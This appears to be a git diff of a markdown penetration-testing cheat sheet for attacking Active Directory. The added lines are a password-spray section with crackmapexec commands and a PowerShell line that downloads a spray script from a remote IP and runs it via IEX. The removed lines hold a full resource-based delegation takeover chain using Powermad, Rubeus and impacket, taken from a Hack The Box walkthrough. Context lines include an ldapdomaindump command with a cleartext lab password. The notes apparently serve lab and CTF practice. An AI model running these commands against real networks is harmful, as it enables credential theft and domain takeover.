@@ -2,7 +2,7 @@
 
 ## Theory
 
-#### AD Structure
+### AD Structure
 
 * Domain Controller (DC) is a Windows Server containing Active Directory Domain Services (AD DS)
 * AD DS data store: **NTDS.dit** - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users.
@@ -15,7 +15,7 @@ Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
 * DC replicate updates from other domain controllers in the forest
 * DC Allows admin access to manage domain resources
 
-#### Forest
+### Forest
 * Forest: collection of one or more trees
 * Tree: collection of several domains with hierarchical order
 * Organizational Units (OUs): Containers for groups, computers, users, printers and other OUs
@@ -26,7 +26,7 @@ Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
 
 Example structre would have top domain like **main.com** and under it may be further domains **sub.main.com** and **external.main.com**. Thos three domain represnet a tree. OUs in main can access sub and external but not in reverse.
 
-#### Users
+### Users
 
 Users are core of AD and DC's task is to manage access of those users to services.
 
@@ -35,14 +35,12 @@ Users are core of AD and DC's task is to manage access of those users to service
 * Local Administrators: local machine administrators. Compromis of local admin can lead to ticket and credentials grabbing from local machine to impersonate other users and services in AD.
 * Domain Users: normal users. They can log into machines where they are authorized to. Users may be part of interesting groups that allows lateral movement once the user account is compromised.
 
-#### Groups
+### Groups
 
 * Security Groups: permissions users and services. Some groups have rights to change DACLs.
 * Distribution Groups: email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration
 
 ## Active Directory Enumeration
-
-### Manual Approach
 
 #### net.exe
 
@@ -97,9 +95,6 @@ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.su
 ```
 
 
-
-### Tooling based Approach
-
 * Helpful **Tools**:
 
 * crackmapexec
@@ -109,6 +104,10 @@ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.su
 * Bloodhound: https://github.com/BloodHoundAD/BloodHound
 * targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast
 
+
+#### Crackmapexec
+
+'cme smb bamdc1.skorp.com -u DUMMY -p Password1 --users'
 
 #### Kerbrute
 
@@ -231,6 +230,7 @@ MATCH p=shortestPath((u {highvalue: false})-[*1..]->(g:Group {name: 'DOMAIN ADMI
 Try attacking AD in this order:
 Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
+* Password Spray
 * Kerberos brute-force
 * ASREPRoast
 * Kerberoasting
@@ -243,6 +243,25 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 * Golden Ticket
 * Windows Management Instr: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
 * Powershell Remoting
+
+
+### Password Spray
+
+* obtain user names with any technique listed above or dumping from somewhere
+
+#### Remote
+* use crackmap remotely
+`cme smb bamdc1.skorp.com -u users_enum.txt -p Password1 | grep '+'`
+
+#### Local
+
+* download script and invoke spray
+
+``` powershell 
+
+IEX(New-Object Net.WebClient).downloadString('http:///192.168.219.141/DomainPasswordSpray.ps1') ; Invoke-DomainPasswordSpray -Password Password1
+
+```
 
 ### Local Host Memmory Dumping
 
@@ -380,57 +399,6 @@ MD4(stdin)= 58a478135a93ac3bf058a5ea0e8fdb71
 * SMB: use some exploit from SMB cheat sheet
 
 
-### Generic All
-
-If some user or group has "Generic All" Permission on any of the other objects than this object can be easily compromised.
-
-Tools needed:
-
-* powermad
-* Rubeus
-
-
-```
-# -------- On Server Side
-# Upload tools
-upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
-upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe
-
-# Import PowerMad
-. .\pm.ps1
-
-# Set variables
-Set-Variable -Name "FakePC" -Value "FAKE01"
-Set-Variable -Name "targetComputer" -Value "DC"
-
-# With Powermad, Add the new fake computer object to AD.
-New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
-
-# With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
-Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')
-
-# With Built-in AD modules, check that the last command worked.
-Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount
-
-
-# With Rubeus, generate the new fake computer object password hashes. 
-#  Since we created the computer object with the password 123456 we will need those hashes
-#  for the next step.
-./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
-
-# -------- On Attck Box Side.
-# Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. 
-impacket-getST support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
-
-# Set local variable of KERB5CCNAME to pass the ccache TGT file for the requested service.
-export KRB5CCNAME=administrator.ccache
-
-# Use smbexec.py to connect with the TGT we just made to the server as the user administrator 
-#  over SMB protocol.
-smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
-
-```
-source> https://cybergladius.com/htb-walkthrough-support/
 
 
 ### Dsync Attack
